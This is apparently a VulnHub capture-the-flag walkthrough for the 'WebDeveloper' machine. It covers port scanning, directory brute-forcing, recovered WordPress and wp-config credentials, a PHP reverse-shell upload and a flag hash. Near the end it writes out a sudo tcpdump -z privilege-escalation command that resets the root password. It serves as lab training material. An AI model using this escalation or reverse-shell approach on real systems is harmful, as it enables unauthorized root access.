---
categories: [vulnhub]
tags: [vulnhub,walkthrough,pentest]
---
# WebDeveloper



## Description ⤵️

>    💡 A machine using the newest
<br><br>
    REMOVED
<br><br>
    ### Server, the newest
<br><br>
    REMOVED
<br><br>
    ### and containing some
<br><br>
    REMOVED
<br><br>
    ## Changelog v1 - 2018/11/05 Beta - 2018/9/22
{: .prompt-info}



Let’s find the IP Address first >>

![Untitled](/Vulnhub-Files/img/WebDeveloper/Untitled.png)

```bash
IP : 192.168.56.107
```

## Port Scan Results ➡️

![Untitled](/Vulnhub-Files/img/WebDeveloper/Untitled%201.png)

```bash
Open Ports >
22	SSH
80	HTTP
```

---

## Web Enumeration ⤵️

![Untitled](/Vulnhub-Files/img/WebDeveloper/Untitled%202.png)

After Directory Bruteforcing we got this :

![Untitled](/Vulnhub-Files/img/WebDeveloper/Untitled%203.png)

After diging in I got this finally :

![Untitled](/Vulnhub-Files/img/WebDeveloper/Untitled%204.png)

```bash
Credentials ->
log = webdeveloper
pwd = Te5eQg&4sBS!Yr$)wf%(DcAd
```

![Untitled](/Vulnhub-Files/img/WebDeveloper/Untitled%205.png)

Now it time to upload reverse shell code and get the shell up and running :>

**With PHP reverse shell linux code I got this :**

![Untitled](/Vulnhub-Files/img/WebDeveloper/Untitled%206.png)

Got these credentials from wp-config.php file :

![Untitled](/Vulnhub-Files/img/WebDeveloper/Untitled%207.png)

```bash
Password : MasterOfTheUniverse
```

![Untitled](/Vulnhub-Files/img/WebDeveloper/Untitled%208.png)

![Untitled](/Vulnhub-Files/img/WebDeveloper/Untitled%209.png)

![Untitled](/Vulnhub-Files/img/WebDeveloper/Untitled%2010.png)

flag.txt :

Congratulations here is youre flag:

`cba045a5a4f26f1cd8d7be9a5c2b1b34f6c5d290`

For the root shell I changed the passwd of root to root with chpasswd command :

```bash
Command :

echo "root:root" > test.txt
COMMAND="cat /tmp/test.txt | chpasswd"
TFt=$(mktemp)
echo "$COMMAND" > $TFt
chmod +x $TFt
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TFt -Z root
```

![Untitled](/Vulnhub-Files/img/WebDeveloper/Untitled%2011.png)

Now the flag →

![Untitled](/Vulnhub-Files/img/WebDeveloper/Untitled%2012.png)

---